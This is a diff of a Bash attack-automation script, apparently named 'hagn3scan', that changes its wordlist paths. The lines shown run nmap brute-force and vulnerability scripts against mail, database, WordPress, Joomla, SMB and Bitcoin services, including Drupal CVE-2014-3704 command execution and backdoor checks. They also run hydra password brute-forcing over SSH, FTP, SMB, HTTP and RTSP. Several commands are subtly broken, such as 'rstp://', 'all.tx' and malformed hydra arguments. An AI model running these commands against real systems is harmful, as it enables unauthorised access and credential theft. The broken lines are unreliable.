@@ -162,14 +162,14 @@ nmap -sI Zombie -Pn -p20-25,110 -r --packet-trace -v www.$nome
 nmap -sI Zombie:113 -Pn -p20-80,110-180 -r –packet-trace -v www.$nome
 nmap --script http-brute -p 8443 www.$nome 
 nmap -sn --script ms-sql-empty-password --script-args mssql.instance-all www.$nome 
-nmap -sT -p3306 --script mysql-brute.nse --script-args userdb=/opt/hagn3scan/wlist/all.txt www.$nome 
+nmap -sT -p3306 --script mysql-brute.nse --script-args userdb=/opt/hagn3scan.github.io/wlist/all.txt www.$nome 
 nmap -sV --script=http-sql-injection www.$nome
 nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL www.$nome 
 nmap -p80 –script=http-email-harvest www.$nome 
 nmap --script=http-email-harvest www.$nome
-nmap -p110 --script pop3-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt www.$nome 
-nmap -p25 --script smtp-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt www.$nome 
-nmap -p143 --script imap-brute --script-args userdb=/opt/hagn3scan/wlist/all.tx,passdb=/opt/hagn3scan/wlist/wordlist.txt www.$nome 
+nmap -p110 --script pop3-brute --script-args userdb=/opt/hagn3scan.github.io/wlist/all.txt,passdb=/opt/hagn3scan.github.io/wlist/wordlist.txt www.$nome 
+nmap -p25 --script smtp-brute --script-args userdb=/opt/hagn3scan.github.io/wlist/all.txt,passdb=/opt/hagn3scan.github.io/wlist/wordlist.txt www.$nome 
+nmap -p143 --script imap-brute --script-args userdb=/opt/hagn3scan.github.io/wlist/all.tx,passdb=/opt/hagn3scan.github.io/wlist/wordlist.txt www.$nome 
 nmap -p80 --script http-google-email --script-args http-google-email.pages=10 www.$nome 
 nmap -sU --script dns-fuzz --script-args timelimit=2h www.$nome 
 nmap -p 445 www.$nome --script=smb-double-pulsar-backdoor 
@@ -189,12 +189,12 @@ nmap -v -p 80 --script http-enum www.$nome
 nmap -v -p 8080 --script http-enum www.$nome 
 nmap -v -p 8443 --script http-enum www.$nome 
 nmap -sV --script http-wordpress-users --script-args limit=50 www.$nome 
-nmap -v -p 80 --script http-wordpress-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt,http-wordpress-brute,threads=3,http-wordpress-brute.uri=/wordpress/wp-login.php www.$nome 
-nmap -v -p 8080 --script http-wordpress-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt,http-wordpress-brute,threads=3,http-wordpress-brute.uri=/wordpress/wp-login.php www.$nome
-nmap -v -p 8443 --script http-wordpress-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt,http-wordpress-brute,threads=3,http-wordpress-brute.uri=/wordpress/wp-login.php www.$nome 
-nmap -v -p 80 --script http-joomla-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt,http-joomla-brute,threads=3,http-joomla-brute.uri=/wordpress/wp-login.php www.$nome 
-nmap -v -p 8080 --script http-joomla-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt,http-joomla-brute,threads=3,http-joomla-brute.uri=/wordpress/wp-login.php www.$nome 
-nmap -v -p 8443 --script http-joomla-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt,http-joomla-brute,threads=3,http-joomla-brute.uri=/wordpress/wp-login.php www.$nome
+nmap -v -p 80 --script http-wordpress-brute --script-args userdb=/opt/hagn3scan.github.io/wlist/all.txt,passdb=/opt/hagn3scan.github.io/wlist/wordlist.txt,http-wordpress-brute,threads=3,http-wordpress-brute.uri=/wordpress/wp-login.php www.$nome 
+nmap -v -p 8080 --script http-wordpress-brute --script-args userdb=/opt/hagn3scan.github.io/wlist/all.txt,passdb=/opt/hagn3scan.github.io/wlist/wordlist.txt,http-wordpress-brute,threads=3,http-wordpress-brute.uri=/wordpress/wp-login.php www.$nome
+nmap -v -p 8443 --script http-wordpress-brute --script-args userdb=/opt/hagn3scan.github.io/wlist/all.txt,passdb=/opt/hagn3scan.github.io/wlist/wordlist.txt,http-wordpress-brute,threads=3,http-wordpress-brute.uri=/wordpress/wp-login.php www.$nome 
+nmap -v -p 80 --script http-joomla-brute --script-args userdb=/opt/hagn3scan.github.io/wlist/all.txt,passdb=/opt/hagn3scan.github.io/wlist/wordlist.txt,http-joomla-brute,threads=3,http-joomla-brute.uri=/wordpress/wp-login.php www.$nome 
+nmap -v -p 8080 --script http-joomla-brute --script-args userdb=/opt/hagn3scan.github.io/wlist/all.txt,passdb=/opt/hagn3scan.github.io/wlist/wordlist.txt,http-joomla-brute,threads=3,http-joomla-brute.uri=/wordpress/wp-login.php www.$nome 
+nmap -v -p 8443 --script http-joomla-brute --script-args userdb=/opt/hagn3scan.github.io/wlist/all.txt,passdb=/opt/hagn3scan.github.io/wlist/wordlist.txt,http-joomla-brute,threads=3,http-joomla-brute.uri=/wordpress/wp-login.php www.$nome
 nmap -p 80--script http-bigip-cookie www.$nome
 nmap -sS $nome -D 10.0.0.1,10.0.0.2,10.0.0.4
 nmap -sU -p 7329 --script tenda-backdoor www.$nome
@@ -204,12 +204,12 @@ nmap -V $nome
 nmap -sU $nome
 nmap -sU --reason $nome
 #out min script
-nmap --script=cics-user-brute --script-args userdb=/opt/hagn3scan/wlist/all.txt,cics-user-brute.commands="exit;logon applid(cics42)" -p 23 www.$nome 
-nmap -sV --script http-wordpress-brute --script-args '/opt/hagn3scan/wlist/wordlist.txt,passdb=/opt/hagn3scan/wlist/all.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true' www.$nome 
+nmap --script=cics-user-brute --script-args userdb=/opt/hagn3scan.github.io/wlist/all.txt,cics-user-brute.commands="exit;logon applid(cics42)" -p 23 www.$nome 
+nmap -sV --script http-wordpress-brute --script-args '/opt/hagn3scan.github.io/wlist/wordlist.txt,passdb=/opt/hagn3scan.github.io/wlist/all.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true' www.$nome 
 nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal" $nome 
 nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.uri="/drupal",http-vuln-cve2014-3704.cleanup=false $nome 
 nmap --script http-passwd --script-args http-passwd.root=/admin/ $nome 
-nmap -p 8332 --script bitcoinrpc-info --script-args creds.global=/opt/hagn3scan/wlist/all.txt:/opt/hagn3scan/wlist/wordlist.txt www.$nome 
+nmap -p 8332 --script bitcoinrpc-info --script-args creds.global=/opt/hagn3scan.github.io/wlist/all.txt:/opt/hagn3scan.github.io/wlist/wordlist.txt www.$nome 
 nmap -sV --script mysql-users www.$nome 
 nmap --script rtsp-url-brute -p 554 $nome
 #nmap -p 554 --script rtsp-methods $nome
@@ -243,21 +243,21 @@ echo -e "\e[00;40m ====================|    PORTS     | ========================
 read -sn 1 -p "Press qualquer tecla e continue <====|====> Ctrl+C  interromper processo ....."
 while true; do tput sc; tput cup 0 $(($(tput cols)-74)); w | grep load; tput rc; sleep 10; done &
 sleep 2         
-sudo hydra -L /opt/hagn3scan/wlist/userfull.txt -P /opt/hagn3scan/wlist/passfull.txt http://$nome
-sudo hydra -L /opt/hagn3scan/wlist/userfull.txt -P /opt/hagn3scan/wlist/passfull.txt ftp://$nome 
-sudo hydra -L /opt/hagn3scan/wlist/userfull.txt -P /opt/hagn3scan/wlist/passfull.txt smb://$nome
-sudo hydra -L /opt/hagn3scan/wlist/userfull.txt -P /opt/hagn3scan/wlist/passfull.txt ssh://$nome
-sudo hydra -L /opt/hagn3scan/wlist/userfull.txt -P /opt/hagn3scan/wlist/passfull.txt rtsp://$nome
+sudo hydra -L /opt/hagn3scan.github.io/wlist/userfull.txt -P /opt/hagn3scan.github.io/wlist/passfull.txt http://$nome
+sudo hydra -L /opt/hagn3scan.github.io/wlist/userfull.txt -P /opt/hagn3scan.github.io/wlist/passfull.txt ftp://$nome 
+sudo hydra -L /opt/hagn3scan.github.io/wlist/userfull.txt -P /opt/hagn3scan.github.io/wlist/passfull.txt smb://$nome
+sudo hydra -L /opt/hagn3scan.github.io/wlist/userfull.txt -P /opt/hagn3scan.github.io/wlist/passfull.txt ssh://$nome
+sudo hydra -L /opt/hagn3scan.github.io/wlist/userfull.txt -P /opt/hagn3scan.github.io/wlist/passfull.txt rtsp://$nome
 sleep 4
 echo " heavy raw phase 2    @ 2 tentativas BRUTE-FORÇA scanner complexo"
 sleep 3
 read -sn 1 -p "Press qualquer tecla e continue   ==>   Ctrl+C  interromper processo ....."
 sleep 1
-sudo hydra -L /opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt http://$nome
-sudo hydra -L /opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt ftp://$nome
-sudo hydra -L /opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt smb://$nome
-sudo hydra -L /opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt ssh://$nome
-sudo hydra -L /opt/hagn3scan/wlist/all.txt,passdb=/opt/hagn3scan/wlist/wordlist.txt rstp://$nome
+sudo hydra -L /opt/hagn3scan.github.io/wlist/all.txt,passdb=/opt/hagn3scan.github.io/wlist/wordlist.txt http://$nome
+sudo hydra -L /opt/hagn3scan.github.io/wlist/all.txt,passdb=/opt/hagn3scan.github.io/wlist/wordlist.txt ftp://$nome
+sudo hydra -L /opt/hagn3scan.github.io/wlist/all.txt,passdb=/opt/hagn3scan.github.io/wlist/wordlist.txt smb://$nome
+sudo hydra -L /opt/hagn3scan.github.io/wlist/all.txt,passdb=/opt/hagn3scan.github.io/wlist/wordlist.txt ssh://$nome
+sudo hydra -L /opt/hagn3scan.github.io/wlist/all.txt,passdb=/opt/hagn3scan.github.io/wlist/wordlist.txt rstp://$nome
 tput setf 5
 echo " Executar outro atack? (s/n)"
 read CONFIRMA
